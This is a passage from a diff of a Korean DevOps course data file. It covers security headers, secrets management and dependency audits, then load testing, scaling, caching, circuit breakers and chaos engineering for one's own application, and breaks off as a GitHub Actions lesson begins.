+# 보안 헤더 추가
+app.use(helmet({
+  frameguard: { action: 'deny' }, // Clickjacking 방지
+  contentTypeOptions: true, // MIME 타입 스니핑 방지
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  }
+}));`
+                },
+                {
+                  heading: "5. Secrets 관리 및 환경변수 보안",
+                  code: `// .env 파일 사용 (절대 Git에 커밋하지 마세요!)
+// .env
+DATABASE_PASSWORD=super_secret_password
+JWT_SECRET=very_long_random_string_here
+API_KEY=sk-1234567890abcdef
+
+// .gitignore에 추가
+echo ".env" >> .gitignore
+
+// 코드에서 사용
+require('dotenv').config();
+
+const dbPassword = process.env.DATABASE_PASSWORD;
+const jwtSecret = process.env.JWT_SECRET;
+
+// Docker Secrets 사용 (프로덕션)
+# docker-compose.yml
+version: '3.8'
+services:
+  app:
+    image: myapp
+    secrets:
+      - db_password
+      - jwt_secret
+
+secrets:
+  db_password:
+    file: ./secrets/db_password.txt
+  jwt_secret:
+    file: ./secrets/jwt_secret.txt
+
+// 코드에서 읽기
+const fs = require('fs');
+
+const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
+const jwtSecret = fs.readFileSync('/run/secrets/jwt_secret', 'utf8').trim();
+
+// AWS Secrets Manager 사용 (클라우드)
+const AWS = require('aws-sdk');
+const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });
+
+async function getSecret(secretName) {
+  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
+  return JSON.parse(data.SecretString);
+}
+
+const secrets = await getSecret('prod/myapp/credentials');
+const dbPassword = secrets.DATABASE_PASSWORD;`
+                },
+                {
+                  heading: "6. 보안 체크리스트 자동화",
+                  code: `# npm audit로 의존성 취약점 점검
+npm audit
+
+# 결과:
+# found 3 vulnerabilities (1 moderate, 2 high) in 1200 scanned packages
+#   run \`npm audit fix\` to fix them, or \`npm audit\` for details
+
+# 자동 수정
+npm audit fix
+
+# 강제 수정 (breaking changes 포함)
+npm audit fix --force
+
+# GitHub Dependabot 활성화
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+
+# Snyk로 실시간 모니터링
+snyk monitor
+# https://app.snyk.io 에서 대시보드 확인
+
+# Pre-commit hook으로 보안 검사
+# .husky/pre-commit
+#!/bin/sh
+npm audit --audit-level=high
+if [ $? -ne 0 ]; then
+  echo "Security vulnerabilities found! Commit aborted."
+  exit 1
+fi`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "OWASP ZAP으로 전체 앱 스캔 후 발견된 취약점 수정",
+                    "CSP 헤더 설정 후 외부 스크립트 차단되는지 확인",
+                    "sqlmap으로 SQL Injection 테스트 후 모든 파라미터 방어 확인",
+                    "실패한 로그인 시도 5번 후 계정 30분 잠금 구현",
+                    "GitHub Actions에 보안 스캔 추가하여 취약점 발견 시 PR 차단"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '3-4',
@@ -2731,7 +4979,873 @@ groups:
             '간단한 부하 테스트 (JMeter 또는 Artillery)',
             '현재 시스템의 동시 접속 한계 측정',
             '서버 증설 계획 작성'
-          ]
+          ],
+          content: {
+            beginner: {
+              title: "초급: 부하 테스트 도구로 시스템 한계 측정하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "부하 테스트의 개념을 이해하고, 간단한 도구로 현재 시스템의 처리 능력을 측정할 수 있다."
+                },
+                {
+                  heading: "1. 부하 테스트가 필요한 이유",
+                  content: "실제 운영 환경에서 장애가 발생하기 전에 시스템의 한계를 파악해야 합니다.",
+                  list: [
+                    "실제 상황: 평소 100명 → 이벤트 때 1만명 → 서버 다운",
+                    "테스트로 미리 발견: 500명에서 응답 시간 5초 증가 → 대비 가능",
+                    "용량 계획 수립: 몇 명까지 감당 가능한지 정확히 알 수 있음",
+                    "병목 지점 파악: DB? 서버? 네트워크?"
+                  ]
+                },
+                {
+                  heading: "2. Apache Bench로 첫 부하 테스트",
+                  steps: [
+                    {
+                      label: "설치 (대부분 OS에 기본 설치됨)",
+                      code: `# macOS/Linux 확인
+which ab
+
+# Ubuntu 설치
+sudo apt install apache2-utils
+
+# Windows
+# https://www.apachelounge.com/download/ 에서 다운로드`
+                    },
+                    {
+                      label: "기본 사용법",
+                      code: `# 100개 요청, 동시 10개
+ab -n 100 -c 10 https://your-app.com/
+
+# 결과:
+Concurrency Level:      10
+Time taken for tests:   2.345 seconds
+Complete requests:      100
+Failed requests:        0
+Total transferred:      45600 bytes
+Requests per second:    42.64 [#/sec] ← 초당 처리량
+Time per request:       234.5 [ms] ← 평균 응답 시간
+Time per request:       23.5 [ms] (mean, across all concurrent requests)
+
+# 해석:
+- 초당 42개 요청 처리 가능
+- 평균 응답 시간 234ms
+- 실패 0개 → 안정적`
+                    },
+                    {
+                      label: "부하 증가시키기",
+                      code: `# 1000개 요청, 동시 100개
+ab -n 1000 -c 100 https://your-app.com/api/products
+
+# 결과:
+Requests per second:    25.32 [#/sec] ← 감소!
+Time per request:       3950.5 [ms] ← 증가!
+Failed requests:        15 ← 실패 발생!
+
+# 문제 발견:
+- 동시 접속 100명에서 성능 저하
+- 일부 요청 실패 (타임아웃)
+- 처리량 42 → 25로 감소 (40% 하락)`
+                    }
+                  ]
+                },
+                {
+                  heading: "3. k6로 시나리오 기반 테스트",
+                  code: `// k6 설치
+// https://k6.io/docs/getting-started/installation/
+
+// test.js
+import http from 'k6/http';
+import { sleep, check } from 'k6';
+
+export const options = {
+  stages: [
+    { duration: '30s', target: 20 },  // 30초 동안 20명까지 증가
+    { duration: '1m', target: 50 },   // 1분 동안 50명 유지
+    { duration: '30s', target: 0 },   // 30초 동안 0명으로 감소
+  ],
+  thresholds: {
+    http_req_duration: ['p(95)<500'], // 95%가 500ms 이내
+    http_req_failed: ['rate<0.01'],   // 실패율 1% 이하
+  },
+};
+
+export default function () {
+  const res = http.get('https://your-app.com/api/products');
+
+  check(res, {
+    '상태 코드 200': (r) => r.status === 200,
+    '응답 시간 < 500ms': (r) => r.timings.duration < 500,
+  });
+
+  sleep(1);
+}
+
+// 실행
+k6 run test.js
+
+// 결과:
+     ✓ 상태 코드 200
+     ✗ 응답 시간 < 500ms
+       ↳  85% — ✓ 4250 / ✗ 750
+
+     http_req_duration..........: avg=450ms min=120ms med=420ms max=2.1s p(95)=680ms ← 임계값 초과!
+     http_req_failed............: 0.80% ✓ 40 ✗ 4960 ← 통과
+     iterations.................: 5000`
+                },
+                {
+                  heading: "4. 동시 접속자 한계 찾기",
+                  code: `# 단계별로 부하 증가
+# Step 1: 동시 10명
+ab -n 100 -c 10 https://your-app.com/
+# 결과: 평균 200ms, 실패 0
+
+# Step 2: 동시 50명
+ab -n 500 -c 50 https://your-app.com/
+# 결과: 평균 400ms, 실패 0
+
+# Step 3: 동시 100명
+ab -n 1000 -c 100 https://your-app.com/
+# 결과: 평균 1200ms, 실패 5 ← 한계 근접
+
+# Step 4: 동시 200명
+ab -n 2000 -c 200 https://your-app.com/
+# 결과: 평균 5000ms, 실패 150 ← 한계 초과!
+
+# 결론: 동시 100~150명이 한계`
+                },
+                {
+                  heading: "5. 서버 리소스 모니터링",
+                  code: `# 테스트 중 서버 리소스 확인
+# SSH로 서버 접속 후
+
+# CPU, 메모리 실시간 확인
+htop
+
+# 또는
+top
+
+# 결과 분석:
+CPU:  85% ← 높음
+Mem:  3.2G/4G (80%) ← 높음
+Load: 4.5, 3.8, 2.1 ← CPU 코어 수보다 높음 (위험)
+
+# Docker 컨테이너별 리소스
+docker stats
+
+# 결과:
+CONTAINER       CPU %    MEM USAGE
+backend         65%      1.8GB ← 가장 높음 (병목!)
+mysql           25%      800MB
+redis           5%       100MB`
+                },
+                {
+                  heading: "6. 간단한 증설 계획",
+                  code: `# 현재 상황 분석
+- 동시 접속 한계: 100~150명
+- 병목: Backend 서버 (CPU 65%, 메모리 1.8GB)
+- 목표: 500명 동시 접속
+
+# 해결 방안
+1. 수직 확장 (Scale Up)
+   - 서버 스펙 업그레이드: 2코어 4GB → 4코어 8GB
+   - 예상 효과: 300명까지 가능
+   - 비용: 월 $40 → $80
+
+2. 수평 확장 (Scale Out)
+   - Backend 서버 2대로 증설 + Load Balancer
+   - 예상 효과: 300~600명까지 가능
+   - 비용: 월 $40 → $100 (서버 2대 + LB)
+
+3. 최적화 (먼저 시도)
+   - 느린 쿼리 개선 (인덱스 추가)
+   - Redis 캐싱 도입
+   - 예상 효과: 200~250명까지 개선
+   - 비용: $0 (기존 인프라)`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "Apache Bench로 메인 페이지 부하 테스트 (100명 동시 접속)",
+                    "k6로 3단계 부하 테스트 (20→50→100명) 스크립트 작성 및 실행",
+                    "동시 접속자를 단계별로 증가시켜 한계점 찾기",
+                    "htop으로 테스트 중 CPU/메모리 사용률 확인",
+                    "현재 시스템의 한계와 개선 방안 문서 작성 (1페이지)"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 실전 부하 테스트와 CapRover 스케일링",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "실제 사용자 패턴을 시뮬레이션하고, CapRover에서 앱을 스케일링할 수 있다."
+                },
+                {
+                  heading: "1. 실전 시나리오 부하 테스트",
+                  code: `// k6로 복잡한 사용자 시나리오 작성
+import http from 'k6/http';
+import { check, group, sleep } from 'k6';
+
+export const options = {
+  stages: [
+    { duration: '2m', target: 100 },  // 2분간 100명까지 증가
+    { duration: '5m', target: 100 },  // 5분간 100명 유지 (피크 타임)
+    { duration: '2m', target: 200 },  // 2분간 200명까지 증가 (이벤트)
+    { duration: '3m', target: 200 },  // 3분간 200명 유지
+    { duration: '2m', target: 0 },    // 2분간 0명으로 감소
+  ],
+  thresholds: {
+    http_req_duration: ['p(95)<1000', 'p(99)<2000'],
+    http_req_failed: ['rate<0.05'],
+    checks: ['rate>0.95'], // 95% 이상 성공
+  },
+};
+
+export default function () {
+  group('사용자 여정', function () {
+    // 1. 홈 페이지 방문
+    let res = http.get('https://your-app.com/');
+    check(res, { '홈 로딩 성공': (r) => r.status === 200 });
+    sleep(2);
+
+    // 2. 상품 목록 조회
+    res = http.get('https://your-app.com/api/products');
+    check(res, {
+      '상품 목록 성공': (r) => r.status === 200,
+      '상품 10개 이상': (r) => JSON.parse(r.body).length >= 10,
+    });
+    sleep(3);
+
+    // 3. 상품 상세 조회 (무작위)
+    const productId = Math.floor(Math.random() * 100) + 1;
+    res = http.get(\`https://your-app.com/api/products/\${productId}\`);
+    check(res, { '상세 조회 성공': (r) => r.status === 200 });
+    sleep(5);
+
+    // 4. 장바구니 추가 (10%만 실행)
+    if (Math.random() < 0.1) {
+      res = http.post('https://your-app.com/api/cart', JSON.stringify({
+        productId: productId,
+        quantity: 1
+      }), {
+        headers: { 'Content-Type': 'application/json' }
+      });
+      check(res, { '장바구니 추가 성공': (r) => r.status === 201 });
+    }
+
+    sleep(1);
+  });
+}
+
+// 실행 및 결과 분석
+k6 run --out json=results.json load-test.js
+
+// 결과:
+     ✓ 홈 로딩 성공.............: 99.8%
+     ✓ 상품 목록 성공...........: 98.5%
+     ✓ 상품 10개 이상...........: 98.5%
+     ✓ 상세 조회 성공...........: 95.2% ← 피크 때 실패율 증가
+     ✓ 장바구니 추가 성공.......: 92.1% ← 가장 낮음
+
+     http_req_duration..........: avg=680ms p(95)=1.2s p(99)=2.5s ← p99 초과!`
+                },
+                {
+                  heading: "2. CapRover에서 앱 스케일링",
+                  steps: [
+                    {
+                      label: "수동 스케일링",
+                      code: `# CapRover 대시보드
+1. Apps 메뉴 → 앱 선택
+2. "App Configs" 탭
+3. "Instance Count" 섹션
+   - 현재: 1
+   - 변경: 3 (3개 인스턴스)
+4. "Save & Update" 클릭
+
+# 결과:
+- 3개의 컨테이너가 실행됨
+- CapRover가 자동으로 Load Balancing
+- 트래픽이 3개에 분산됨
+
+# 확인
+docker ps | grep app-name
+# app-name.1  (포트 32771)
+# app-name.2  (포트 32772)
+# app-name.3  (포트 32773)
+
+# 부하 테스트 재실행
+ab -n 1000 -c 200 https://your-app.com/
+# 개선:
+# Before: Requests/sec: 50, Time/req: 4000ms
+# After:  Requests/sec: 140, Time/req: 1400ms (280% 향상!)`
+                    },
+                    {
+                      label: "Docker Compose로 스케일링",
+                      code: `# docker-compose.yml
+version: '3.8'
+services:
+  app:
+    image: myapp:latest
+    deploy:
+      replicas: 3 # 3개 인스턴스
+      resources:
+        limits:
+          cpus: '1'
+          memory: 512M
+        reservations:
+          cpus: '0.5'
+          memory: 256M
+    environment:
+      NODE_ENV: production
+
+  nginx:
+    image: nginx:alpine
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf
+    depends_on:
+      - app
+
+# nginx.conf (로드 밸런서)
+upstream backend {
+  server app:3000;
+  # Docker Compose가 자동으로 3개 인스턴스에 분산
+}
+
+server {
+  listen 80;
+  location / {
+    proxy_pass http://backend;
+    proxy_set_header Host $host;
+  }
+}
+
+# 실행
+docker-compose up --scale app=3`
+                    }
+                  ]
+                },
+                {
+                  heading: "3. 데이터베이스 병목 해결",
+                  code: `// 문제: DB 연결 수 부족
+// Error: ER_TOO_MANY_CONNECTIONS
+
+// 해결 1: Connection Pooling 최적화
+const mysql = require('mysql2/promise');
+
+const pool = mysql.createPool({
+  host: 'localhost',
+  user: 'root',
+  password: 'password',
+  database: 'mydb',
+  waitForConnections: true,
+  connectionLimit: 50, // 10 → 50으로 증가
+  queueLimit: 0,
+  enableKeepAlive: true,
+  keepAliveInitialDelay: 10000
+});
+
+// 해결 2: Read Replica 사용
+const masterPool = mysql.createPool({
+  host: 'mysql-master.example.com',
+  // ... (쓰기 전용)
+});
+
+const replicaPool = mysql.createPool({
+  host: 'mysql-replica.example.com',
+  // ... (읽기 전용)
+});
+
+app.get('/api/products', async (req, res) => {
+  // 읽기는 Replica에서
+  const [products] = await replicaPool.query('SELECT * FROM products');
+  res.json(products);
+});
+
+app.post('/api/products', async (req, res) => {
+  // 쓰기는 Master에서
+  await masterPool.query('INSERT INTO products ...', [...]);
+  res.json({ success: true });
+});
+
+// 해결 3: 쿼리 캐싱
+const cache = new Map();
+
+app.get('/api/products', async (req, res) => {
+  const cacheKey = 'products:all';
+
+  if (cache.has(cacheKey)) {
+    return res.json(cache.get(cacheKey));
+  }
+
+  const [products] = await pool.query('SELECT * FROM products');
+  cache.set(cacheKey, products);
+
+  // 5분 후 캐시 삭제
+  setTimeout(() => cache.delete(cacheKey), 5 * 60 * 1000);
+
+  res.json(products);
+});`
+                },
+                {
+                  heading: "4. CDN과 정적 파일 분리",
+                  code: `// 문제: 이미지/CSS/JS 요청이 서버 부하 증가
+
+// 해결: Cloudflare CDN 사용
+// 1. Cloudflare 계정 생성
+// 2. 도메인 추가
+// 3. 네임서버 변경
+
+// 정적 파일 캐싱 규칙
+// Cloudflare 대시보드 → Page Rules
+// URL: *your-app.com/assets/*
+// Settings:
+//   - Cache Level: Cache Everything
+//   - Edge Cache TTL: 1 month
+//   - Browser Cache TTL: 1 year
+
+// Express에서 정적 파일 분리
+app.use('/assets', express.static('public', {
+  maxAge: '1y',
+  immutable: true,
+  setHeaders: (res, path) => {
+    res.set('Access-Control-Allow-Origin', '*');
+  }
+}));
+
+// HTML에서 CDN URL 사용
+<link rel="stylesheet" href="https://cdn.your-app.com/assets/style.css">
+<img src="https://cdn.your-app.com/assets/logo.png">
+
+// 효과:
+// Before: 서버가 모든 요청 처리 (이미지/CSS/JS 포함)
+// After: CDN이 정적 파일 처리 → 서버 부하 70% 감소`
+                },
+                {
+                  heading: "5. 자동 스케일링 (Auto Scaling) 개념",
+                  code: `// Kubernetes HPA (Horizontal Pod Autoscaler) 예시
+// hpa.yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: myapp-hpa
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: myapp
+  minReplicas: 2
+  maxReplicas: 10
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 70 # CPU 70% 시 스케일 아웃
+
+# 적용
+kubectl apply -f hpa.yaml
+
+# 동작 원리:
+# 1. CPU 사용률이 70% 초과 → 파드 추가
+# 2. CPU 사용률이 50% 미만 → 파드 감소
+# 3. 최소 2개, 최대 10개 유지
+
+# AWS ECS Auto Scaling 예시
+aws application-autoscaling register-scalable-target \\
+  --service-namespace ecs \\
+  --scalable-dimension ecs:service:DesiredCount \\
+  --resource-id service/my-cluster/my-service \\
+  --min-capacity 2 \\
+  --max-capacity 10
+
+aws application-autoscaling put-scaling-policy \\
+  --policy-name cpu-scaling \\
+  --service-namespace ecs \\
+  --scalable-dimension ecs:service:DesiredCount \\
+  --resource-id service/my-cluster/my-service \\
+  --policy-type TargetTrackingScaling \\
+  --target-tracking-scaling-policy-configuration file://config.json
+
+# config.json
+{
+  "TargetValue": 70.0,
+  "PredefinedMetricSpecification": {
+    "PredefinedMetricType": "ECSServiceAverageCPUUtilization"
+  }
+}`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "k6로 실제 사용자 여정 시나리오 작성 후 15분간 부하 테스트",
+                    "CapRover에서 앱 인스턴스를 1개 → 3개로 증가 후 성능 비교",
+                    "MySQL Connection Pool 크기 조정 후 동시 접속 한계 재측정",
+                    "Cloudflare CDN 연결 후 정적 파일 응답 시간 90% 이상 개선",
+                    "CPU 70% 도달 시 자동 스케일링 규칙 설정 (CapRover 또는 K8s)"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: 대규모 트래픽 대비 아키텍처 설계",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "수백만 사용자를 처리할 수 있는 확장 가능한 아키텍처를 설계하고 구현할 수 있다."
+                },
+                {
+                  heading: "1. 분산 부하 테스트 (Distributed Load Testing)",
+                  code: `// k6 Cloud로 전 세계 다중 위치 테스트
+k6 cloud run load-test.js
+
+// 또는 Grafana k6 Cloud 설정
+export const options = {
+  cloud: {
+    name: 'Global Load Test',
+    projectID: 12345,
+    distribution: {
+      'amazon:us:ashburn': { loadZone: 'amazon:us:ashburn', percent: 40 },
+      'amazon:ie:dublin': { loadZone: 'amazon:ie:dublin', percent: 30 },
+      'amazon:jp:tokyo': { loadZone: 'amazon:jp:tokyo', percent: 30 },
+    },
+  },
+  stages: [
+    { duration: '5m', target: 10000 }, // 1만 명까지
+  ],
+};
+
+// Locust로 분산 테스트 (Python)
+# locustfile.py
+from locust import HttpUser, task, between
+
+class WebsiteUser(HttpUser):
+    wait_time = between(1, 3)
+
+    @task(3)
+    def view_products(self):
+        self.client.get("/api/products")
+
+    @task(1)
+    def view_product_detail(self):
+        product_id = random.randint(1, 100)
+        self.client.get(f"/api/products/{product_id}")
+
+# Master 서버에서 실행
+locust -f locustfile.py --master
+
+# Worker 서버 3대에서 실행
+locust -f locustfile.py --worker --master-host=<master-ip>
+
+# 웹 UI에서 테스트 시작: http://localhost:8089
+# 목표: 10만 명 동시 사용자`
+                },
+                {
+                  heading: "2. 멀티 리전 배포 아키텍처",
+                  code: `# AWS Global Accelerator + CloudFront
+# architecture.yml
+Resources:
+  # 1. 멀티 리전 배포
+  USEastApp:
+    Type: AWS::ECS::Service
+    Properties:
+      Cluster: !Ref ECSCluster
+      # us-east-1 리전
+
+  EUWestApp:
+    Type: AWS::ECS::Service
+    Properties:
+      Cluster: !Ref ECSCluster
+      # eu-west-1 리전
+
+  APNortheastApp:
+    Type: AWS::ECS::Service
+    Properties:
+      Cluster: !Ref ECSCluster
+      # ap-northeast-1 리전
+
+  # 2. Global Accelerator (지연 시간 기반 라우팅)
+  GlobalAccelerator:
+    Type: AWS::GlobalAccelerator::Accelerator
+    Properties:
+      IpAddressType: IPV4
+
+  # 3. CloudFront (정적 파일 + 동적 콘텐츠)
+  CDN:
+    Type: AWS::CloudFront::Distribution
+    Properties:
+      Origins:
+        - DomainName: api.example.com
+          OriginPath: /api
+          CustomOriginConfig:
+            OriginProtocolPolicy: https-only
+
+# Geo-DNS with Route 53
+resource "aws_route53_record" "www" {
+  zone_id = aws_route53_zone.main.zone_id
+  name    = "www"
+  type    = "A"
+
+  geolocation_routing_policy {
+    continent = "NA" # 북미 → us-east-1
+  }
+
+  alias {
+    name                   = aws_lb.us_east.dns_name
+    zone_id                = aws_lb.us_east.zone_id
+    evaluate_target_health = true
+  }
+}
+
+# 효과:
+# - 한국 사용자 → 서울 리전 (지연 50ms)
+# - 미국 사용자 → 버지니아 리전 (지연 30ms)
+# - 유럽 사용자 → 아일랜드 리전 (지연 40ms)`
+                },
+                {
+                  heading: "3. Database Sharding (샤딩)",
+                  content: "데이터를 여러 데이터베이스로 분산하여 처리량 향상:",
+                  code: `// 사용자 ID 기반 샤딩
+const shards = [
+  mysql.createPool({ host: 'db-shard-1.example.com' }), // shard 0
+  mysql.createPool({ host: 'db-shard-2.example.com' }), // shard 1
+  mysql.createPool({ host: 'db-shard-3.example.com' }), // shard 2
+  mysql.createPool({ host: 'db-shard-4.example.com' }), // shard 3
+];
+
+function getShardForUser(userId) {
+  return shards[userId % shards.length];
+}
+
+app.get('/api/users/:userId', async (req, res) => {
+  const userId = parseInt(req.params.userId);
+  const shard = getShardForUser(userId);
+
+  const [users] = await shard.query(
+    'SELECT * FROM users WHERE id = ?',
+    [userId]
+  );
+
+  res.json(users[0]);
+});
+
+// 예시:
+// userId = 1 → shard 1 (1 % 4 = 1)
+// userId = 5 → shard 1 (5 % 4 = 1)
+// userId = 8 → shard 0 (8 % 4 = 0)
+
+// 샤드 간 조인 방지 (비정규화)
+// Bad: 샤드 A의 users와 샤드 B의 orders 조인 불가
+// Good: orders 테이블에 user_name 컬럼 추가 (중복 허용)
+
+// 샤드 리밸런싱 (샤드 추가 시)
+async function rebalanceShards(newShardCount) {
+  // 1. 새 샤드 추가
+  const newShards = [...shards];
+  for (let i = shards.length; i < newShardCount; i++) {
+    newShards.push(mysql.createPool({
+      host: \`db-shard-\${i + 1}.example.com\`
+    }));
+  }
+
+  // 2. 데이터 재배치 (점진적으로)
+  // 일부 사용자를 새 샤드로 이동
+}`
+                },
+                {
+                  heading: "4. 캐시 전략 고도화",
+                  code: `// 다층 캐싱 (Multi-tier Caching)
+// L1: 애플리케이션 메모리 (빠름, 작음)
+// L2: Redis (중간, 큼)
+// L3: CDN (느림, 매우 큼)
+
+const NodeCache = require('node-cache');
+const Redis = require('ioredis');
+
+const l1Cache = new NodeCache({ stdTTL: 60 }); // 1분
+const l2Cache = new Redis();
+
+app.get('/api/products/:id', async (req, res) => {
+  const productId = req.params.id;
+
+  // L1 캐시 확인
+  let product = l1Cache.get(\`product:\${productId}\`);
+  if (product) {
+    return res.json({ product, source: 'L1-memory' });
+  }
+
+  // L2 캐시 확인
+  product = await l2Cache.get(\`product:\${productId}\`);
+  if (product) {
+    l1Cache.set(\`product:\${productId}\`, JSON.parse(product));
+    return res.json({ product: JSON.parse(product), source: 'L2-redis' });
+  }
+
+  // DB 조회
+  [product] = await db.query('SELECT * FROM products WHERE id = ?', [productId]);
+
+  // 캐시 저장
+  l1Cache.set(\`product:\${productId}\`, product);
+  await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product)); // 1시간
+
+  res.json({ product, source: 'DB' });
+});
+
+// Cache Stampede 방지 (동시 캐시 미스)
+const locks = new Map();
+
+async function getProductWithLock(productId) {
+  const lockKey = \`lock:product:\${productId}\`;
+
+  // 잠금 확인
+  if (locks.has(lockKey)) {
+    // 다른 요청이 이미 DB 조회 중 → 대기
+    await locks.get(lockKey);
+    return l2Cache.get(\`product:\${productId}\`);
+  }
+
+  // 잠금 설정
+  const promise = db.query('SELECT * FROM products WHERE id = ?', [productId])
+    .then(async ([product]) => {
+      await l2Cache.setex(\`product:\${productId}\`, 3600, JSON.stringify(product));
+      locks.delete(lockKey);
+      return product;
+    });
+
+  locks.set(lockKey, promise);
+  return promise;
+}`
+                },
+                {
+                  heading: "5. Circuit Breaker 패턴",
+                  content: "장애가 발생한 서비스로의 요청을 차단하여 연쇄 장애 방지:",
+                  code: `const CircuitBreaker = require('opossum');
+
+// 외부 API 호출
+async function callExternalAPI(data) {
+  const response = await fetch('https://external-api.com/data', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    timeout: 3000
+  });
+  return response.json();
+}
+
+// Circuit Breaker 설정
+const breaker = new CircuitBreaker(callExternalAPI, {
+  timeout: 3000, // 3초 타임아웃
+  errorThresholdPercentage: 50, // 50% 실패 시
+  resetTimeout: 30000, // 30초 후 재시도
+  volumeThreshold: 10 // 최소 10개 요청 필요
+});
+
+// 상태 모니터링
+breaker.on('open', () => {
+  console.log('Circuit breaker opened - stopping requests');
+});
+
+breaker.on('halfOpen', () => {
+  console.log('Circuit breaker half-open - testing');
+});
+
+breaker.on('close', () => {
+  console.log('Circuit breaker closed - normal operation');
+});
+
+// 사용
+app.post('/api/process', async (req, res) => {
+  try {
+    const result = await breaker.fire(req.body);
+    res.json(result);
+  } catch (err) {
+    if (err.message === 'Breaker is open') {
+      // Fallback 응답
+      res.json({
+        error: 'Service temporarily unavailable',
+        fallback: true
+      });
+    } else {
+      res.status(500).json({ error: err.message });
+    }
+  }
+});
+
+// 동작:
+// 1. 정상: 모든 요청 통과
+// 2. 50% 실패: Circuit Open (모든 요청 차단)
+// 3. 30초 후: Half-Open (테스트 요청 1개)
+// 4. 성공: Circuit Close (정상화)
+// 5. 실패: 다시 Open (30초 대기)`
+                },
+                {
+                  heading: "6. Chaos Engineering (카오스 엔지니어링)",
+                  code: `# Chaos Monkey (Netflix) - 무작위 서버 종료 시뮬레이션
+# chaos.sh
+#!/bin/bash
+
+while true; do
+  # 30% 확률로 랜덤 컨테이너 종료
+  if [ $((RANDOM % 10)) -lt 3 ]; then
+    CONTAINER=$(docker ps -q | shuf -n 1)
+    echo "Killing container: $CONTAINER"
+    docker kill $CONTAINER
+  fi
+
+  sleep 300 # 5분마다
+done
+
+# Litmus Chaos (Kubernetes)
+# pod-delete-chaos.yaml
+apiVersion: litmuschaos.io/v1alpha1
+kind: ChaosEngine
+metadata:
+  name: pod-delete-chaos
+spec:
+  engineState: 'active'
+  chaosServiceAccount: pod-delete-sa
+  experiments:
+  - name: pod-delete
+    spec:
+      components:
+        env:
+        - name: TOTAL_CHAOS_DURATION
+          value: '60'
+        - name: CHAOS_INTERVAL
+          value: '10'
+        - name: FORCE
+          value: 'false'
+
+# 적용
+kubectl apply -f pod-delete-chaos.yaml
+
+# 테스트 시나리오:
+# 1. 피크 타임에 무작위 파드 삭제
+# 2. 애플리케이션이 자동 복구되는지 확인
+# 3. 사용자 경험에 영향이 없는지 모니터링
+
+# 네트워크 지연 주입
+tc qdisc add dev eth0 root netem delay 200ms 50ms
+# 200ms ± 50ms 지연 추가
+
+# 패킷 손실 주입
+tc qdisc change dev eth0 root netem loss 10%
+# 10% 패킷 손실`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "k6 Cloud로 전 세계 3개 지역에서 동시 부하 테스트 (총 1만 사용자)",
+                    "사용자 ID 기반 DB 샤딩 구현 후 처리량 3배 이상 향상 확인",
+                    "다층 캐싱 (메모리 + Redis + CDN) 구현 후 캐시 히트율 90% 이상 달성",
+                    "Circuit Breaker로 외부 API 장애 시 자동 차단 및 Fallback 응답",
+                    "Chaos Monkey로 무작위 서버 종료 시뮬레이션 후 자동 복구 확인"
+                  ]
+                }
+              ]
+            }
+          }
         }
       ]
     },
@@ -2748,7 +5862,947 @@ groups:
           goal: '안전하고 빠르게 배포할 수 있다',
           hours: 15,
           keywords: ['CI/CD', 'Git workflow', 'automated deployment'],
-          tasks: []
+          tasks: [
+            'GitHub Actions 워크플로우 작성',
+            '자동 테스트 설정',
+            'Blue-Green 배포 구현'
+          ],
+          content: {
+            beginner: {
+              title: "초급: CI/CD 개념과 GitHub Actions 기본",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "CI/CD가 무엇인지 이해하고, GitHub Actions로 간단한 자동화 파이프라인을 만들 수 있다."
+                },
+                {
+                  heading: "1. CI/CD가 왜 필요한가?",
+                  content: "수동 배포의 문제점과 자동화의 이점을 이해합니다.",
+                  list: [
+                    "수동 배포: 개발자가 서버 SSH 접속 → git pull → npm install → pm2 restart (10분 소요, 실수 가능)",
+                    "자동 배포: git push만 하면 자동으로 테스트 → 빌드 → 배포 (2분 소요, 실수 없음)",
+                    "빠른 피드백: 코드 푸시 후 5분 안에 배포 완료 또는 실패 알림",
+                    "안정성: 테스트 실패 시 자동으로 배포 중단"
+                  ]
+                },
+                {
+                  heading: "2. CI와 CD의 차이",
+                  code: `# CI (Continuous Integration) - 지속적 통합
+- 개발자가 코드를 push할 때마다:
+  1. 코드 린팅 (문법 체크)
+  2. 유닛 테스트 실행
+  3. 빌드 성공 확인
+- 목표: 버그를 빠르게 발견
+
+# CD (Continuous Deployment) - 지속적 배포
+- CI가 성공하면:
+  1. 빌드된 결과물을 서버에 배포
+  2. 서비스 재시작
+  3. 헬스 체크
+- 목표: 사용자에게 빠르게 전달
+
+# 전체 흐름:
+git push → CI (테스트) → CD (배포) → 사용자에게 도달`
+                },
+                {
+                  heading: "3. GitHub Actions 첫 워크플로우",
+                  steps: [
+                    {
+                      label: "기본 구조",
+                      code: `# .github/workflows/ci.yml
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Setup Node.js
